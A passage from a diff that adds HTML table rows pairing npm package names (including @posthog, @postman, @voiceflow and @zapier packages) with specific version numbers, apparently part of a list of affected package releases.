+<td align="left">[0.0.6]</td>
+</tr>
+<tr>
+<td align="left">@posthog/plugin-server</td>
+<td align="left">[1.10.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/plugin-unduplicates</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/postgres-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/react-rrweb-player</td>
+<td align="left">[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrdom</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb-player</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb-record</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb-replay</td>
+<td align="left">[0.0.19]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb-snapshot</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb-utils</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/rrweb</td>
+<td align="left">[0.0.31]</td>
+</tr>
+<tr>
+<td align="left">@posthog/sendgrid-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/siphash</td>
+<td align="left">[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">@posthog/snowflake-export-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/taxonomy-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/twilio-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/twitter-followers-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/url-normalizer-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/variance-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/web-dev-server</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@posthog/wizard</td>
+<td align="left">[1.18.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/zendesk-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@postman/aether-icons</td>
+<td align="left">[2.23.2],[2.23.3],[2.23.4]</td>
+</tr>
+<tr>
+<td align="left">@postman/csv-parse</td>
+<td align="left">[4.0.3],[4.0.4],[4.0.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/final-node-keytar</td>
+<td align="left">[7.9.1],[7.9.2],[7.9.3]</td>
+</tr>
+<tr>
+<td align="left">@postman/mcp-ui-client</td>
+<td align="left">[5.5.1],[5.5.2],[5.5.3]</td>
+</tr>
+<tr>
+<td align="left">@postman/node-keytar</td>
+<td align="left">[7.9.4],[7.9.5],[7.9.6]</td>
+</tr>
+<tr>
+<td align="left">@postman/pm-bin-linux-x64</td>
+<td align="left">[1.24.3],[1.24.4],[1.24.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/pm-bin-macos-arm64</td>
+<td align="left">[1.24.3],[1.24.4],[1.24.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/pm-bin-macos-x64</td>
+<td align="left">[1.24.3],[1.24.4],[1.24.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/pm-bin-windows-x64</td>
+<td align="left">[1.24.3],[1.24.4],[1.24.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/postman-collection-fork</td>
+<td align="left">[4.3.3],[4.3.4],[4.3.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/postman-mcp-cli</td>
+<td align="left">[1.0.3],[1.0.4],[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@postman/postman-mcp-server</td>
+<td align="left">[2.4.10],[2.4.11],[2.4.12]</td>
+</tr>
+<tr>
+<td align="left">@postman/pretty-ms</td>
+<td align="left">[6.1.1],[6.1.2],[6.1.3]</td>
+</tr>
+<tr>
+<td align="left">@postman/secret-scanner-wasm</td>
+<td align="left">[2.1.2],[2.1.3],[2.1.4]</td>
+</tr>
+<tr>
+<td align="left">@postman/tunnel-agent</td>
+<td align="left">[0.6.5],[0.6.6],[0.6.7]</td>
+</tr>
+<tr>
+<td align="left">@postman/wdio-allure-reporter</td>
+<td align="left">[0.0.7],[0.0.8],[0.0.9]</td>
+</tr>
+<tr>
+<td align="left">@postman/wdio-junit-reporter</td>
+<td align="left">[0.0.4],[0.0.5],[0.0.6]</td>
+</tr>
+<tr>
+<td align="left">@pradhumngautam/common-app</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@pruthvi21/use-debounce</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-document-translator</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-git-clean-markdown</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-markdown-compose</td>
+<td align="left">[1.4.2506300029]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-markdown-image</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-markdown-print</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-markdown-translator</td>
+<td align="left">[1.4.2509202331]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-markdown</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-remove-image-background</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@quick-start-soft/quick-task-refine</td>
+<td align="left">[1.4.2511142126]</td>
+</tr>
+<tr>
+<td align="left">@relyt/claude-context-core</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@relyt/claude-context-mcp</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@relyt/mcp-server-relytone</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@seezo/sdr-mcp-server</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">@seung-ju/next</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@seung-ju/openapi-generator</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@seung-ju/react-hooks</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@seung-ju/react-native-action-sheet</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">@sme-ui/aoma-vevasound-metadata-lib</td>
+<td align="left">[0.1.3]</td>
+</tr>
+<tr>
+<td align="left">@strapbuild/react-native-date-time-picker</td>
+<td align="left">[2.0.4]</td>
+</tr>
+<tr>
+<td align="left">@strapbuild/react-native-perspective-image-cropper-2</td>
+<td align="left">[0.4.7]</td>
+</tr>
+<tr>
+<td align="left">@strapbuild/react-native-perspective-image-cropper-poojan31</td>
+<td align="left">[0.4.6]</td>
+</tr>
+<tr>
+<td align="left">@strapbuild/react-native-perspective-image-cropper</td>
+<td align="left">[0.4.15]</td>
+</tr>
+<tr>
+<td align="left">@suraj_h/medium-common</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@thedelta/eslint-config</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@tiaanduplessis/json</td>
+<td align="left">[2.0.2],[2.0.3]</td>
+</tr>
+<tr>
+<td align="left">@tiaanduplessis/react-progressbar</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trefox/sleekshop-js</td>
+<td align="left">[0.1.6]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-acl</td>
+<td align="left">[4.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-elasticsearch</td>
+<td align="left">[2.0.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-mongoose</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-orientdb</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-postgres</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-pubsub</td>
+<td align="left">[4.0.3]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-redis</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-soap</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix-swagger</td>
+<td align="left">[3.0.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/atrix</td>
+<td align="left">[7.0.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/bool-expressions</td>
+<td align="left">[4.1.3]</td>
+</tr>
+<tr>
+<td align="left">@trigo/eslint-config-trigo</td>
+<td align="left">[3.3.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/fsm</td>
+<td align="left">[3.4.2]</td>
+</tr>
+<tr>
+<td align="left">@trigo/hapi-auth-signedlink</td>
+<td align="left">[1.3.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/jsdt</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/keycloak-api</td>
+<td align="left">[1.3.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/node-soap</td>
+<td align="left">[0.5.4]</td>
+</tr>
+<tr>
+<td align="left">@trigo/pathfinder-ui-css</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@trigo/trigo-hapijs</td>
+<td align="left">[5.0.1]</td>
+</tr>
+<tr>
+<td align="left">@trpc-rate-limiter/cloudflare</td>
+<td align="left">[0.1.4]</td>
+</tr>
+<tr>
+<td align="left">@trpc-rate-limiter/hono</td>
+<td align="left">[0.1.4]</td>
+</tr>
+<tr>
+<td align="left">@varsityvibe/api-client</td>
+<td align="left">[1.3.36],[1.3.37]</td>
+</tr>
+<tr>
+<td align="left">@varsityvibe/utils</td>
+<td align="left">[5.0.6]</td>
+</tr>
+<tr>
+<td align="left">@varsityvibe/validation-schemas</td>
+<td align="left">[0.6.7],[0.6.8]</td>
+</tr>
+<tr>
+<td align="left">@vishadtyagi/full-year-calendar</td>
+<td align="left">[0.1.11]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/alexa-types</td>
+<td align="left">[2.15.60],[2.15.61]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/anthropic</td>
+<td align="left">[0.4.4],[0.4.5]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/api-sdk</td>
+<td align="left">[3.28.58],[3.28.59]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/backend-utils</td>
+<td align="left">[5.0.1],[5.0.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/base-types</td>
+<td align="left">[2.136.2],[2.136.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/body-parser</td>
+<td align="left">[1.21.2],[1.21.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/chat-types</td>
+<td align="left">[2.14.58],[2.14.59]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/circleci-config-sdk-orb-import</td>
+<td align="left">[0.2.1],[0.2.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/commitlint-config</td>
+<td align="left">[2.6.1],[2.6.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/common</td>
+<td align="left">[8.9.1],[8.9.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/default-prompt-wrappers</td>
+<td align="left">[1.7.3],[1.7.4]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/dependency-cruiser-config</td>
+<td align="left">[1.8.11]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/dtos-interact</td>
+<td align="left">[1.40.1],[1.40.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/encryption</td>
+<td align="left">[0.3.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/eslint-config</td>
+<td align="left">[7.16.4],[7.16.5]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/eslint-plugin</td>
+<td align="left">[1.6.1],[1.6.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/exception</td>
+<td align="left">[1.10.1],[1.10.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/fetch</td>
+<td align="left">[1.11.1],[1.11.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/general-types</td>
+<td align="left">[3.2.22],[3.2.23]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/git-branch-check</td>
+<td align="left">[1.4.3],[1.4.4]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/google-dfes-types</td>
+<td align="left">[2.17.12],[2.17.13]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/google-types</td>
+<td align="left">[2.21.12],[2.21.13]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/husky-config</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/logger</td>
+<td align="left">[2.4.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/metrics</td>
+<td align="left">[1.5.1],[1.5.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/natural-language-commander</td>
+<td align="left">[0.5.2],[0.5.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-common</td>
+<td align="left">[2.75.2],[2.75.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-mongodb</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-rate-limit</td>
+<td align="left">[1.3.2],[1.3.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-redis</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-timeout</td>
+<td align="left">[1.3.1],[1.3.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/npm-package-json-lint-config</td>
+<td align="left">[1.1.1],[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/openai</td>
+<td align="left">[3.2.2],[3.2.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/pino-pretty</td>
+<td align="left">[4.4.1],[4.4.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/pino</td>
+<td align="left">[6.11.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/prettier-config</td>
+<td align="left">[1.10.1],[1.10.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/react-chat</td>
+<td align="left">[1.65.3],[1.65.4]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/runtime-client-js</td>
+<td align="left">[1.17.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/runtime</td>
+<td align="left">[1.29.1],[1.29.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/sdk-runtime</td>
+<td align="left">[1.43.1],[1.43.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/secrets-provider</td>
+<td align="left">[1.9.2],[1.9.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/semantic-release-config</td>
+<td align="left">[1.4.1],[1.4.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/serverless-plugin-typescript</td>
+<td align="left">[2.1.7],[2.1.8]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/slate-serializer</td>
+<td align="left">[1.7.3],[1.7.4]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/stitches-react</td>
+<td align="left">[2.3.2],[2.3.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/storybook-config</td>
+<td align="left">[1.2.2],[1.2.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/stylelint-config</td>
+<td align="left">[1.1.1],[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/test-common</td>
+<td align="left">[2.1.1],[2.1.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/tsconfig-paths</td>
+<td align="left">[1.1.4],[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/tsconfig</td>
+<td align="left">[1.12.1],[1.12.2]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/utils-designer</td>
+<td align="left">[1.74.19],[1.74.20]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/verror</td>
+<td align="left">[1.1.4],[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/vite-config</td>
+<td align="left">[2.6.2],[2.6.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/vitest-config</td>
+<td align="left">[1.10.2],[1.10.3]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/voice-types</td>
+<td align="left">[2.10.58],[2.10.59]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/voiceflow-types</td>
+<td align="left">[3.32.45],[3.32.46]</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/widget</td>
+<td align="left">[1.7.18],[1.7.19]</td>
+</tr>
+<tr>
+<td align="left">@zapier/ai-actions-react</td>
+<td align="left">[0.1.12],[0.1.13],[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@zapier/ai-actions</td>
+<td align="left">[0.1.18],[0.1.19],[0.1.20]</td>
+</tr>
+<tr>
+<td align="left">@zapier/babel-preset-zapier</td>
+<td align="left">[6.4.1],[6.4.2],[6.4.3]</td>
+</tr>
+<tr>
+<td align="left">@zapier/browserslist-config-zapier</td>
+<td align="left">[1.0.3],[1.0.4],[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@zapier/eslint-plugin-zapier</td>
+<td align="left">[11.0.3],[11.0.4],[11.0.5]</td>
+</tr>
+<tr>
+<td align="left">@zapier/mcp-integration</td>
+<td align="left">[3.0.1],[3.0.2],[3.0.3]</td>
+</tr>
+<tr>
+<td align="left">@zapier/secret-scrubber</td>
+<td align="left">[1.1.3],[1.1.4],[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">@zapier/spectral-api-ruleset</td>
+<td align="left">[1.9.1],[1.9.2],[1.9.3]</td>
+</tr>
+<tr>
+<td align="left">@zapier/stubtree</td>
+<td align="left">[0.1.2],[0.1.3],[0.1.4]</td>
+</tr>
+<tr>
+<td align="left">@zapier/zapier-sdk</td>
+<td align="left">[0.15.5],[0.15.6],[0.15.7]</td>
+</tr>
+<tr>
+<td align="left">02-echo</td>
+<td align="left">[0.0.7]</td>
+</tr>
+<tr>
+<td align="left">ai-crowl-shield</td>
+<td align="left">[1.0.7]</td>
+</tr>
+<tr>
+<td align="left">arc-cli-fc</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">asyncapi-preview</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">atrix-mongoose</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">atrix</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">automation_model</td>
+<td align="left">[1.0.491]</td>
+</tr>
+<tr>
+<td align="left">axios-builder</td>
+<td align="left">[1.2.1]</td>
+</tr>
+<tr>
+<td align="left">axios-cancelable</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">axios-timed</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">barebones-css</td>
+<td align="left">[1.1.3],[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">benmostyn-frame-print</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">best_gpio_controller</td>
+<td align="left">[1.0.10]</td>
+</tr>
+<tr>
+<td align="left">bidirectional-adapter</td>
+<td align="left">[1.2.2],[1.2.3],[1.2.4],[1.2.5]</td>
+</tr>
+<tr>
+<td align="left">blinqio-executions-cli</td>
+<td align="left">[1.0.41]</td>
+</tr>
+<tr>
+<td align="left">blob-to-base64</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">bool-expressions</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">bun-plugin-httpfile</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">bytecode-checker-cli</td>
+<td align="left">[1.0.10],[1.0.11],[1.0.8],[1.0.9]</td>
+</tr>
+<tr>
+<td align="left">bytes-to-x</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">calc-loan-interest</td>
+<td align="left">[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">capacitor-plugin-apptrackingios</td>
+<td align="left">[0.0.21]</td>
+</tr>
+<tr>
+<td align="left">capacitor-plugin-purchase</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">capacitor-plugin-scgssigninwithgoogle</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">capacitor-purchase-history</td>
+<td align="left">[0.0.10]</td>
+</tr>
+<tr>
+<td align="left">capacitor-voice-recorder-wav</td>
+<td align="left">[6.0.3]</td>
+</tr>
+<tr>
+<td align="left">chrome-extension-downloads</td>
+<td align="left">[0.0.3],[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">claude-token-updater</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">coinmarketcap-api</td>
+<td align="left">[3.1.2],[3.1.3]</td>
+</tr>
+<tr>
+<td align="left">colors-regex</td>
+<td align="left">[2.0.1]</td>
+</tr>
+<tr>
+<td align="left">command-irail</td>
+<td align="left">[0.5.4]</td>
+</tr>
+<tr>
+<td align="left">compare-obj</td>
+<td align="left">[1.1.1],[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">composite-reducer</td>
+<td align="left">[1.0.2],[1.0.3],[1.0.4],[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">count-it-down</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">cpu-instructions</td>
+<td align="left">[0.0.14]</td>
+</tr>
+<tr>
+<td align="left">create-director-app</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">create-glee-app</td>
+<td align="left">[0.2.2],[0.2.3]</td>
+</tr>
+<tr>
+<td align="left">create-hardhat3-app</td>
+<td align="left">[1.1.1],[1.1.2],[1.1.3],[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">create-mcp-use-app</td>
+<td align="left">[0.5.3],[0.5.4]</td>
+</tr>
+<tr>
+<td align="left">crypto-addr-codec</td>
+<td align="left">[0.1.9]</td>
+</tr>
+<tr>
+<td align="left">css-dedoupe</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">dashboard-empty-state</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">designstudiouiux</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">devstart-cli</td>
+<td align="left">[1.0.6]</td>
+</tr>
+<tr>
+<td align="left">dialogflow-es</td>
+<td align="left">[1.1.1],[1.1.2],[1.1.3],[1.1.4]</td>
+</tr>
+<tr>
+<td align="left">discord-bot-server</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">docusaurus-plugin-vanilla-extract</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">dont-go</td>
+<td align="left">[1.1.2]</td>
+</tr>
+<tr>
+<td align="left">dotnet-template</td>
+<td align="left">[0.0.3],[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">drop-events-on-property-plugin</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">email-deliverability-tester</td>
+<td align="left">[1.1.1]</td>
+</tr>
+<tr>
+<td align="left">enforce-branch-name</td>
+<td align="left">[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">esbuild-plugin-brotli</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">esbuild-plugin-eta</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">esbuild-plugin-httpfile</td>
+<td align="left">[0.4.1]</td>
+</tr>
+<tr>
+<td align="left">eslint-config-nitpicky</td>
+<td align="left">[4.0.1]</td>
+</tr>
+<tr>
+<td align="left">eslint-config-trigo</td>
+<td align="left">[22.0.2]</td>
+</tr>
+<tr>
+<td align="left">eslint-config-zeallat-base</td>
+<td align="left">[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">ethereum-ens</td>
+<td align="left">[0.8.1]</td>
+</tr>
+<tr>
+<td align="left">evm-checkcode-cli</td>
+<td align="left">[1.0.12],[1.0.13],[1.0.14],[1.0.15]</td>
+</tr>
+<tr>
+<td align="left">exact-ticker</td>
+<td align="left">[0.3.5]</td>
+</tr>
+<tr>
+<td align="left">expo-audio-session</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">expressos</td>
+<td align="left">[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">fat-fingered</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">feature-flip</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">firestore-search-engine</td>
+<td align="left">[1.2.3]</td>
+</tr>
+<tr>
+<td align="left">fittxt</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">flapstacks</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">flatten-unflatten</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">formik-error-focus</td>
+<td align="left">[2.0.1]</td>
+</tr>
+<tr>
+<td align="left">formik-store</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">fuzzy-finder</td>
+<td align="left">[1.0.5],[1.0.6]</td>
+</tr>
+<tr>
+<td align="left">gate-evm-check-code2</td>
+<td align="left">[2.0.3],[2.0.4],[2.0.5],[2.0.6]</td>
+</tr>
+<tr>
+<td align="left">gate-evm-tools-test</td>
+<td align="left">[1.0.5],[1.0.6],[1.0.7],[1.0.8]</td>
+</tr>
+<tr>
+<td align="left">gatsby-plugin-cname</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">generator-meteor-stock</td>
+<td align="left">[0.1.6]</td>
+</tr>
+<tr>
+<td align="left">generator-ng-itobuz</td>
+<td align="left">[0.0.15]</td>
+</tr>
+<tr>
+<td align="left">get-them-args</td>
+<td align="left">[1.3.3]</td>
+</tr>
+<tr>
+<td align="left">github-action-for-generator</td>
+<td align="left">[2.1.27],[2.1.28]</td>
+</tr>
+<tr>
+<td align="left">gitsafe</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">go-template</td>
+<td align="left">[0.1.8],[0.1.9]</td>
+</tr>
+<tr>
+<td align="left">gulp-inject-envs</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">haufe-axera-api-client</td>
+<td align="left">[0.0.1],[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">hope-mapboxdraw</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">hopedraw</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">hover-design-prototype</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">httpness</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">hyper-fullfacing</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">hyperterm-hipster</td>
+<td align="left">[1.0.7]</td>
+</tr>
+<tr>
+<td align="left">image-to-uri</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">invo</td>
+<td align="left">[0.2.2]</td>
+</tr>
+<tr>
+<td align="left">iron-shield-miniapp</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">ito-button</td>
+<td align="left">[8.0.3]</td>
+</tr>
+<tr>
+<td align="left">itobuz-angular-auth</td>
+<td align="left">[8.0.11]</td>
+</tr>
+<tr>
+<td align="left">itobuz-angular-button</td>
+<td align="left">[8.0.11]</td>
+</tr>
+<tr>
+<td align="left">itobuz-angular</td>
+<td align="left">[0.0.1]</td>
+</tr>
+<tr>
+<td align="left">jacob-zuma</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">jaetut-varit-test</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">jan-browser</td>
+<td align="left">[0.13.1]</td>
+</tr>
+<tr>
+<td align="left">jquery-bindings</td>
+<td align="left">[1.1.2],[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">jsonsurge</td>
+<td align="left">[1.0.7]</td>
+</tr>
+<tr>
+<td align="left">just-toasty</td>
+<td align="left">[1.7.1]</td>
+</tr>
+<tr>
+<td align="left">kill-port</td>
+<td align="left">[2.0.2],[2.0.3]</td>
+</tr>
+<tr>
+<td align="left">korea-administrative-area-geo-json-util</td>
+<td align="left">[1.0.7]</td>
+</tr>
+<tr>
+<td align="left">kwami</td>
+<td align="left">[1.5.10],[1.5.9]</td>
+</tr>
+<tr>
+<td align="left">lang-codes</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
